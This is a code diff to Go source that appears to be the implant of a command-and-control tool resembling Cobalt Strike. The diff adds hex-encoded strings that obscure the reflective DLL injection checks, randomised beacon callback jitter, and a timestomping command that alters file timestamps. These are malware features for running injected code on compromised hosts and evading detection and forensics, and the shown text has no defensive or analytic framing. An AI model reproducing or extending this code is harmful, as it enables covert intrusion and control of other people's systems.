@@ -2,6 +2,8 @@ package services
 
 import (
 	"bytes"
+	"crypto/rand"
+	"encoding/hex"
 	"errors"
 	"fmt"
 	"io"
@@ -9,6 +11,7 @@ import (
 	"main/crypt"
 	"main/packet"
 	"main/util"
+	"math/big"
 	"os"
 	"runtime"
 	"strconv"
@@ -185,8 +188,8 @@ func CmdMkdir(cmdBuf []byte) ([]byte, error) {
 	return packet.Mkdir(cmdBuf)
 }
 
-func CmdDrives() ([]byte, error) {
-	return packet.Drives()
+func CmdDrives(cmdBuf []byte) ([]byte, error) {
+	return packet.Drives(cmdBuf)
 }
 
 func CmdRm(cmdBuf []byte) ([]byte, error) {
@@ -310,7 +313,9 @@ func CmdPowershellPort(cmdBuf []byte, powershellImport []byte) ([]byte, error) {
 }
 
 func CmdInjectX64(cmdBuf []byte) ([]byte, error) {
-	if strings.Contains(string(cmdBuf), "ReflectiveLoader") {
+	rx64, _ := hex.DecodeString("5265666c6563746976654c6f61646572") //ReflectiveLoader
+	rHead, _ := hex.DecodeString("4d5a41525548")
+	if bytes.Contains(cmdBuf, rx64) && !bytes.HasPrefix(cmdBuf[8:], rHead) {
 		cmdBuf = bytes.ReplaceAll(cmdBuf, []byte("ExitProcess"), []byte("ExitThread\x00"))
 		return packet.DllInjectSelf([]byte("\x00"), cmdBuf[8:])
 	}
@@ -318,7 +323,9 @@ func CmdInjectX64(cmdBuf []byte) ([]byte, error) {
 }
 
 func CmdInjectX86(cmdBuf []byte) ([]byte, error) {
-	if strings.Contains(string(cmdBuf), "ReflectiveLoader") {
+	rx86, _ := hex.DecodeString("5265666c6563746976654c6f61646572") //ReflectiveLoader
+	rHead, _ := hex.DecodeString("4d5a41525548")
+	if bytes.Contains(cmdBuf, rx86) && !bytes.HasPrefix(cmdBuf[8:], rHead) {
 		cmdBuf = bytes.ReplaceAll(cmdBuf, []byte("ExitProcess"), []byte("ExitThread\x00"))
 		return packet.DllInjectSelf([]byte("\x00"), cmdBuf[8:])
 	}
@@ -335,4 +342,28 @@ func CmdExit() ([]byte, error) {
 	}
 	os.Exit(0)
 	return []byte("success exit"), nil
+}
+
+func CallbackTime() (time.Duration, error) {
+	waitTime := config.WaitTime.Milliseconds()
+	jitter := int64(config.Jitter)
+	if jitter <= 0 || jitter > 100 {
+		return config.WaitTime, nil
+	}
+	result, err := rand.Int(rand.Reader, big.NewInt(2*waitTime/100*jitter))
+	if err != nil {
+		return config.WaitTime, err
+	}
+	waitTime = result.Int64() + waitTime - waitTime/100*jitter
+	return time.Duration(waitTime) * time.Millisecond, nil
+}
+
+func CMDBof(cmdBuf []byte) ([]byte, error) {
+	if bytes.Contains(cmdBuf, []byte("SetFileTime")) {
+		cmdBuf = bytes.ReplaceAll(cmdBuf, []byte("\x00"), []byte(""))
+		buffers := bytes.Split(cmdBuf, []byte("\r"))
+		buffers = bytes.Split(buffers[len(buffers)-1], []byte("\n"))
+		return packet.TimeStomp(buffers[0], buffers[1])
+	}
+	return []byte("This function is not supported now."), nil
 }
